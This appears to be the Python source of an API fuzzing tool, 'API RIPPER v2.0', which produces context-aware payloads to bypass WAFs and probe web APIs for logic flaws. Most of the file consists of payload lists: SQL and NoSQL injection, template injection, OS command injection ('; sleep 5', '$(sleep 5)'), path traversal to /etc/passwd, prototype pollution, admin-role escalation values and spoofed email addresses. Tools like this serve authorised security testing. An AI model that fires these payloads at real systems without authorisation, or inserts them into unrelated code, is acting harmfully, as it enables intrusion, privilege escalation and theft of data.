"""
API RIPPER v2.0 — Contextual Mutation Engine (Elite Level)
Generates semantically aware, context-driven fuzzing payloads
to bypass WAFs and expose deep business logic flaws.

Features:
  - Contextual awareness: Detects if a field is price, age, ID, email, etc.
  - Multi-vector mutations: Numeric bounds, string overflows, logic bypass.
  - Encoding variations: Unicode normalization bypass, JSON interop attacks.
  - State-breaking: Null injection, type confusion.
"""

import logging
import random
import re
from typing import Any, Dict, List

logger = logging.getLogger(__name__)

class ContextualMutationEngine:
    """
    Elite-level payload generation engine.
    Does not just blindly fuzz—understands the semantics of the field.
    """

    def __init__(self):
        self.context_patterns = {
            "price": re.compile(r'(price|amount|cost|fee|balance|total)', re.I),
            "id": re.compile(r'(id|uuid|guid|_id|identifier)', re.I),
            "email": re.compile(r'(email|mail|address)', re.I),
            "role": re.compile(r'(role|is_admin|admin|permission|group)', re.I),
            "quantity": re.compile(r'(qty|quantity|count|limit|size)', re.I),
            "status": re.compile(r'(status|state|is_active)', re.I)
        }

    def generate_mutations(self, field_name: str, original_value: Any, expected_type: str) -> List[Any]:
        """
        Generate elite-level mutations tailored to the field context and type.
        """
        context = self._determine_context(field_name)
        mutations = []

        # 1. Context-Specific Logic Bypasses
        if context == "price" or context == "quantity":
            mutations.extend([
                -1, -99999999, 0, 0.0000001, 1.0e-10, 
                2147483647, 2147483648, 9223372036854775807,
                "NaN", "Infinity", "-Infinity", None
            ])
            # Type confusion
            mutations.extend([str(original_value), [original_value], {"value": original_value}])

        elif context == "role":
            mutations.extend([
                "admin", "Admin", "ADMIN", "root", "superuser", "system", 
                1, True, "true", "1", ["admin"]
            ])

        elif context == "id":
            import uuid
            mutations.extend([
                0, -1, 1, 99999999,
                "00000000-0000-0000-0000-000000000000",
                "ffffffff-ffff-ffff-ffff-ffffffffffff",
                str(uuid.uuid4()), # Dynamic UUID injection
                "admin", "root",
                "../", "%00", None, [original_value]
            ])
            if isinstance(original_value, str) and original_value.isdigit():
                mutations.append(str(int(original_value) + 1))
                mutations.append(str(int(original_value) - 1))
            elif isinstance(original_value, int):
                mutations.append(original_value + 1)
                mutations.append(original_value - 1)

        elif context == "email":
            mutations.extend([
                "admin@target.com",
                "root@localhost",
                "a@b.com",
                "test@test.com%00.evil.com",
                "admin@target.com\u0000",
                "\"admin@target.com\"",
                "admin@target.com.evil.com",
            ])

        # 2. Advanced Type-Based Fuzzing
        if expected_type == "string" or isinstance(original_value, str):
            mutations.extend(self._elite_string_mutations(original_value))
        elif expected_type == "integer" or isinstance(original_value, int):
            mutations.extend(self._elite_numeric_mutations())
        elif expected_type == "boolean" or isinstance(original_value, bool):
            mutations.extend([not original_value, str(not original_value), int(not original_value), None])
        elif expected_type == "array" or isinstance(original_value, list):
            mutations.extend([[], [None], original_value * 100, original_value + ["admin", -1, "' OR 1=1--"]])

        # 3. JSON Interoperability / Parser Confusion
        mutations.extend([
            {"$ne": None}, 
            {"$gt": ""}, 
            {"__proto__": {"admin": True}},
            "constructor",
            "\u0000",
        ])

        # Deduplicate while preserving order and type (dict/list are unhashable, so we use string rep for dedup)
        seen = set()
        unique_mutations = []
        for m in mutations:
            rep = repr(m)
            if rep not in seen:
                seen.add(rep)
                unique_mutations.append(m)

        return unique_mutations

    def _determine_context(self, field_name: str) -> str:
        if not field_name:
            return "generic"
        for context, pattern in self.context_patterns.items():
            if pattern.search(field_name):
                return context
        return "generic"

    def _elite_string_mutations(self, base_val: str) -> List[Any]:
        return [
            "", " ", "\x00", "\n", "\r\n", "\t",
            "A" * 1024, "A" * 10000,
            # NoSQL Injection
            {"$regex": ".*"}, {"$ne": ""},
            # SQLi (Time-based & Boolean)
            "' OR SLEEP(5)--", "'; WAITFOR DELAY '0:0:5'--", "' OR 1=1--",
            # SSTI / Template
            "{{7*7}}", "${7*7}", "<%= 7*7 %>",
            # OS Command
            "| ping -c 5 127.0.0.1", "; sleep 5", "$(sleep 5)",
            # LFI / Path Traversal
            "../../../../../../../../etc/passwd", "..%2f..%2f..%2f..%2fetc%2fpasswd",
            # Unicode Normalization (Bypasses basic WAF rules)
            "admin\uFEFF", "\u0041\u030A", "％００", "ｓｃｒｉｐｔ"
        ]

    def _elite_numeric_mutations(self) -> List[Any]:
        return [
            -1, 0, 1,
            2147483647, -2147483648,  # Int32
            4294967295,               # UInt32
            9223372036854775807,      # Int64
            1.7976931348623157e+308,  # Float overflow
            -0.0, float('nan'), float('inf'),
            # Type confusion strings
            "1", "-1", "0x01", "1e10",
            # Array confusion
            [1], [0, 1]
        ]

    def apply_mutation_to_payload(self, original_payload: Dict, field_path: str, mutation: Any) -> Dict:
        """
        Safely apply a mutation to a deeply nested JSON payload using dot notation.
        """
        import copy
        new_payload = copy.deepcopy(original_payload)
        
        parts = field_path.split('.')
        current = new_payload
        for i, part in enumerate(parts[:-1]):
            # Handle array indices like items[0]
            if '[' in part and ']' in part:
                arr_name = part[:part.find('[')]
                idx = int(part[part.find('[')+1:part.find(']')])
                if arr_name not in current:
                    current[arr_name] = []
                # Expand array if needed
                while len(current[arr_name]) <= idx:
                    current[arr_name].append({})
                current = current[arr_name][idx]
            else:
                if part not in current:
                    current[part] = {}
                current = current[part]
        
        last_part = parts[-1]
        if '[' in last_part and ']' in last_part:
            arr_name = last_part[:last_part.find('[')]
            idx = int(last_part[last_part.find('[')+1:last_part.find(']')])
            if arr_name not in current:
                current[arr_name] = []
            while len(current[arr_name]) <= idx:
                current[arr_name].append(None)
            current[arr_name][idx] = mutation
        else:
            current[last_part] = mutation
            
        return new_payload
